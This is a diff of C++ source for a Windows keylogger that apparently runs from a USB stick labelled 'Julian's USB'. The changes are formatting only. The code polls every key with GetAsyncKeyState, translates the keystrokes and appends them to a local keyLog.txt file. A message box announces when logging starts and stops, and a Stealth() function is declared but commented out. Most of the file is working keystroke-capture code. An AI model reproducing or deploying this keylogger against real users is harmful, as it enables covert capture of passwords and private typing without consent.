@@ -8,20 +8,25 @@
 #include <iomanip>
 #include <string>
 using namespace std;
+
 //void Stealth();
 string translateKey(int keyStroke);
 void logKey(string keyStroke);
+
 int main()
 { 
     enum Status{disable, enable};
     Status log = enable;
+
     MessageBox(NULL, "Key Logging Status: ON", "Julian's USB", MB_OK | MB_ICONASTERISK);
+
     while(log == enable)
     {
         for (int i = 0; i < 256; i++)
         {
             bool LShiftDown = GetAsyncKeyState(VK_LSHIFT);
             bool LControlDown = GetAsyncKeyState(VK_LCONTROL);
+
             if (LShiftDown && LControlDown)
             { 
                 log = disable;
@@ -32,7 +37,9 @@ int main()
             }
         }
     }
+
     MessageBox(NULL, "Key Logging Status: OFF", "Julian's USB", MB_OK | MB_ICONASTERISK);
+    
     return 0;
 }
 
@@ -47,14 +54,17 @@ int main()
 void logKey(string keyStroke)
 {
     ofstream outfile;
+
     outfile.open("keyLog.txt", ios_base::out | ios_base::app);
     outfile << keyStroke;
+
     outfile.close();
 }
 string translateKey(int keyStroke)
 {
     string key;
     bool shiftIsDown = GetAsyncKeyState(VK_LSHIFT);
+
     if (char(keyStroke) >= 'A' && char(keyStroke) <= 'Z')
     {
         if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0 || shiftIsDown)
@@ -70,8 +80,8 @@ string translateKey(int keyStroke)
     {
         if (!shiftIsDown)
         {
-            ostringstream strm;
-            strm << hex << int(keyStroke);
+           ostringstream strm;
+           strm << hex << int(keyStroke);
            key = char(keyStroke);
         }
         else
@@ -113,7 +123,8 @@ string translateKey(int keyStroke)
     }
     else
     {
-        switch (keyStroke) {
+        switch (keyStroke)
+        {
         case VK_DELETE:
            key = "[Delete]";
             break;
